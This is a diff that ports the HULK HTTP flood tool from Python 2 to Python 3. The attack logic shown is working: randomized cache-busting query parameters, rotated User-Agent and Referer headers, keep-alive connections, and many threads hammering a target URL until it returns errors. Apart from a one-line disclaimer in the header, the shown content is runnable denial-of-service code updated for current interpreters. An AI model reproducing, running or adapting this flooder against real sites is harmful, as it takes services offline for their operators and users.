@@ -6,8 +6,10 @@
 # and any malicious usage of this tool is prohibited.
 #
 # author :  Barry Shteiman , version 1.0
+# python3 ported
 # ----------------------------------------------------------------------------------------------
-import urllib2
+import urllib.request
+import urllib.error
 import sys
 import threading
 import random
@@ -69,10 +71,10 @@ def buildblock(size):
 	return(out_str)
 
 def usage():
-	print '---------------------------------------------------'
-	print 'USAGE: python hulk.py <url>'
-	print 'you can add "safe" after url, to autoshut after dos'
-	print '---------------------------------------------------'
+	print('---------------------------------------------------')
+	print('USAGE: python hulk.py <url>')
+	print('you can add "safe" after url, to autoshut after dos')
+	print('---------------------------------------------------')
 
 	
 #http request
@@ -84,27 +86,29 @@ def httpcall(url):
 		param_joiner="&"
 	else:
 		param_joiner="?"
-	request = urllib2.Request(url + param_joiner + buildblock(random.randint(3,10)) + '=' + buildblock(random.randint(3,10)))
+	request = urllib.request.Request(url + param_joiner + buildblock(random.randint(3,10)) + '=' + buildblock(random.randint(3,10)))
 	request.add_header('User-Agent', random.choice(headers_useragents))
 	request.add_header('Cache-Control', 'no-cache')
 	request.add_header('Accept-Charset', 'ISO-8859-1,utf-8;q=0.7,*;q=0.7')
 	request.add_header('Referer', random.choice(headers_referers) + buildblock(random.randint(5,10)))
-	request.add_header('Keep-Alive', random.randint(110,120))
+	request.add_header('Keep-Alive', str(random.randint(110,120)))
 	request.add_header('Connection', 'keep-alive')
 	request.add_header('Host',host)
 	try:
-			urllib2.urlopen(request)
-	except urllib2.HTTPError, e:
+			urllib.request.urlopen(request)
+	except urllib.error.HTTPError as e:
 			#print e.code
 			set_flag(1)
-			print 'Response Code 500'
+			print('Response Code 500')
 			code=500
-	except urllib2.URLError, e:
+	except urllib.error.URLError as e:
 			#print e.reason
 			sys.exit()
+	except Exception as e:
+			pass
 	else:
 			inc_counter()
-			urllib2.urlopen(request)
+			urllib.request.urlopen(request)
 	return(code)		
 
 	
@@ -114,9 +118,9 @@ class HTTPThread(threading.Thread):
 		try:
 			while flag<2:
 				code=httpcall(url)
-				if (code==500) & (safe==1):
+				if (code==500) and (safe==1):
 					set_flag(2)
-		except Exception, ex:
+		except Exception as ex:
 			pass
 
 # monitors http threads and counts requests
@@ -124,11 +128,11 @@ class MonitorThread(threading.Thread):
 	def run(self):
 		previous=request_counter
 		while flag==0:
-			if (previous+100<request_counter) & (previous<>request_counter):
-				print "%d Requests Sent" % (request_counter)
+			if (previous+100<request_counter) and (previous != request_counter):
+				print("%d Requests Sent" % (request_counter))
 				previous=request_counter
 		if flag==2:
-			print "\n-- HULK Attack Finished --"
+			print("\n-- HULK Attack Finished --")
 
 #execute 
 if len(sys.argv) < 2:
@@ -139,7 +143,7 @@ else:
 		usage()
 		sys.exit()
 	else:
-		print "-- HULK Attack Started --"
+		print("-- HULK Attack Started --")
 		if len(sys.argv)== 3:
 			if sys.argv[2]=="safe":
 				set_safe()
